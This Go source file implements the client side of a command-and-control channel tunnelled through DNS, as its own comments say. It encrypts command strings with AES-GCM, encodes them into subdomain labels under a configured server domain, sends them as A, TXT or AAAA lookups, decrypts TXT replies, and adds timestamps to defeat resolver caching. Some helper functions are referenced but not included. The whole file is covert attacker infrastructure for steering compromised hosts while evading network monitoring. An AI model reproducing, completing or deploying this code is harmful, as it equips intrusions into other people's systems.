package main

import (
	"fmt"
	"net"
	"strings"
	"time"
)

// DNSClient handles DNS-based C2 communication
type DNSClient struct {
	config *Config
	aesKey []byte
}

// NewDNSClient creates a new DNS C2 client
func NewDNSClient(config *Config) *DNSClient {
	// Generate AES key from encryption key in config
	aesKey := generateAESKey(config.EncryptionKey)

	return &DNSClient{
		config: config,
		aesKey: aesKey,
	}
}

// encodeCommand encrypts and encodes a command string for DNS transmission
func (c *DNSClient) encodeCommand(command string) (string, error) {
	// Use AES-GCM encryption + base36 encoding
	encoded, err := encryptAndEncode(command, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt and encode command: %v", err)
	}
	return encoded, nil
}

// decodeResponse decodes and decrypts a DNS response back to readable format
func (c *DNSClient) decodeResponse(encoded string) (string, error) {
	// Use base36 decoding + AES-GCM decryption
	decoded, err := decodeAndDecrypt(encoded, c.aesKey)
	if err != nil {
		return "", fmt.Errorf("failed to decode and decrypt response: %v", err)
	}
	return decoded, nil
}

// sendDNSQuery sends a command via DNS query
func (c *DNSClient) sendDNSQuery(command string) (string, error) {
	encodedCmd, err := c.encodeCommand(command)
	if err != nil {
		return "", fmt.Errorf("failed to encode command: %v", err)
	}

	// Limit command length
	if len(encodedCmd) > c.config.MaxCommandLength {
		return "", fmt.Errorf("command too long: %d characters (max %d)", len(encodedCmd), c.config.MaxCommandLength)
	}

	// Create DNS query with encoded command as subdomain
	// Split into 62-character chunks to comply with DNS label limits
	var labels []string
	for len(encodedCmd) > 0 {
		chunkSize := len(encodedCmd)
		if chunkSize > 62 {
			chunkSize = 62
		}
		labels = append(labels, encodedCmd[:chunkSize])
		encodedCmd = encodedCmd[chunkSize:]
	}

	queryName := fmt.Sprintf("%s.%s", strings.Join(labels, "."), c.config.ServerDomain)

	var result string

	// Determine query type
	var qtype uint16
	switch c.config.QueryType {
	case "A":
		qtype = 1
	case "TXT":
		qtype = 16
	case "AAAA":
		qtype = 28
	default:
		qtype = 1
	}

	for attempt := 0; attempt < c.config.RetryAttempts; attempt++ {
		// Use raw DNS if custom server specified, otherwise use standard library
		if c.config.DNSServer != "" {
			// Use raw DNS query to specific server
			results, rawErr := c.sendRawDNSQuery(queryName, qtype, c.config.DNSServer)
			if rawErr == nil && len(results) > 0 {
				if c.config.QueryType == "TXT" {
					// Try to decode TXT records
					for _, txt := range results {
						decoded, decErr := c.decodeResponse(txt)
						if decErr == nil {
							result = decoded
						} else {
							result = fmt.Sprintf("Raw TXT: %s", txt)
						}
						break
					}
				} else {
					result = fmt.Sprintf("DNS Response: %v", results)
				}
				err = nil
				break
			}
			err = rawErr
		} else {
			// Use standard library DNS resolution
			switch c.config.QueryType {
			case "A":
				addrs, lookupErr := net.LookupHost(queryName)
				if lookupErr == nil && len(addrs) > 0 {
					result = fmt.Sprintf("DNS Response IPs: %v", addrs)
					err = nil
					break
				}
				err = lookupErr

			case "TXT":
				txtRecords, lookupErr := net.LookupTXT(queryName)
				if lookupErr == nil && len(txtRecords) > 0 {
					// Try to decode TXT records
					for _, txt := range txtRecords {
						decoded, decErr := c.decodeResponse(txt)
						if decErr == nil {
							result = decoded
						} else {
							result = fmt.Sprintf("Raw TXT: %s", txt)
						}
						break
					}
					err = nil
					break
				}
				err = lookupErr

			default:
				addrs, lookupErr := net.LookupHost(queryName)
				if lookupErr == nil && len(addrs) > 0 {
					result = fmt.Sprintf("DNS Response IPs: %v", addrs)
					err = nil
					break
				}
				err = lookupErr
			}
		}

		if err == nil {
			break
		}

		if attempt < c.config.RetryAttempts-1 {
			time.Sleep(time.Duration(attempt+1) * time.Second)
		}
	}

	if err != nil {
		return "", fmt.Errorf("DNS query failed after %d attempts: %v", c.config.RetryAttempts, err)
	}

	return result, nil
} // sendCommand is the main interface for sending commands
func (c *DNSClient) sendCommand(command string) (string, error) {
	if strings.TrimSpace(command) == "" {
		return "", fmt.Errorf("empty command")
	}

	// Add timestamp to command to bypass DNS caching on recursive resolvers
	timestamp := fmt.Sprintf("%d", time.Now().Unix())
	commandWithTimestamp := fmt.Sprintf("%s|%s", command, timestamp)

	return c.sendDNSQuery(commandWithTimestamp)
}
